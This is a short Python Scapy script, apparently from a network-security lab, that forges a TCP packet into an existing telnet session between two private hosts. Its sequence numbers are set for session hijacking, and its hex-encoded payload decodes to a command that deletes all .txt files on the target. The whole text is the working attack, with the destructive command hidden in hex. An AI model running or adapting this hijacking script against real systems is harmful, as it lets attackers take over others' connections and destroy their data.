from scapy.all import *
ip = IP(src="10.0.2.4", dst="10.0.2.5")
tcp = TCP(sport=50152, dport=23, flags="A", seq=1010266099, ack=1884527147)
data = "726d202a2e747874200a"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
